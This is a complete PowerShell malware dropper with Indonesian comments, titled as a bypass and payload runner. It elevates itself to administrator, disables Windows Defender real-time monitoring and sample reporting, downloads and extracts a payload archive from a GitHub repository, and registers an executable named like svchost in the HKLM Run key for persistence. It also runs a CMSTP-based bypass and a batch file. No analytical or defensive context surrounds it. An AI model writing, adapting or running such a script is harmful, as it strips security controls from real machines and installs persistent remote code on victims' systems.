# ===========================================
# PowerShell Script: Bypass + Payload Runner
# ===========================================

# Function: Dapatkan lokasi PowerShell
function Get-PSLocation {
    $paths = @(
        "C:\Program Files\PowerShell\7\pwsh.exe",
        "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    )
    foreach ($path in $paths) {
        if (Test-Path $path) {
            return $path
        }
    }
    Write-Host "PowerShell not found." -ForegroundColor Red
    exit
}

# Function: Cek akses Assembly
function Check-Assembly {
    param ([string]$assemblyName)
    try {
        [void][Reflection.Assembly]::LoadWithPartialName($assemblyName) | Out-Null
        Write-Host "Assembly $assemblyName loaded."
    } catch {
        Write-Host "Assembly $assemblyName failed to load." -ForegroundColor Red
    }
}

# Function: Cek dan jalankan ulang sebagai Admin
function Ensure-Elevated {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $ps = Get-PSLocation
        Start-Process -FilePath $ps -ArgumentList '-NoExit','-File', $MyInvocation.MyCommand.Definition -Verb RunAs
        exit
    }
}

Ensure-Elevated

# Cek Versi OS
$OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName
$supported = @("Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022")
if ($supported -notcontains ($OSVersion -split ' ')[0]) {
    Write-Host "Unsupported OS: $OSVersion" -ForegroundColor Red
    exit
}

Write-Host "OS Verified: $OSVersion"

# Defender Settings
Write-Host "Disabling Defender Realtime Protection..."
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

# Download payload
$folder = "C:\ProgramData\AppData"
$zipUrl = "https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main"
$zipPath = "$folder\XMASTERTES.zip"
$extractPath = "$folder\XMASTERTES-main"
$exePath = "$extractPath\svchost_.exe"

Write-Host "Downloading payload..."
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

Write-Host "Extracting payload..."
Expand-Archive -Path $zipPath -DestinationPath $folder -Force

# Tambahkan ke startup
Write-Host "Setting startup..."
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d $exePath /f

# Bypass via CMSTP jika tersedia
$cmstp = "$env:SystemRoot\System32\cmstp.exe"
if (Test-Path $cmstp) {
    $infPath = "$extractPath\CMSTPProfile.inf"
    if (Test-Path $infPath) {
        Write-Host "Running CMSTP bypass..."
        Start-Process $cmstp -ArgumentList "/s", $infPath
    } else {
        Write-Host "CMSTPProfile.inf not found." -ForegroundColor Yellow
    }
} else {
    Write-Host "cmstp.exe not available." -ForegroundColor Yellow
}

# Eksekusi RunScript.bat jika ada
if (Test-Path "$extractPath\RunScript.bat") {
    Start-Process "$extractPath\RunScript.bat"
}

Start-Sleep -Seconds 2
Write-Host "Done."
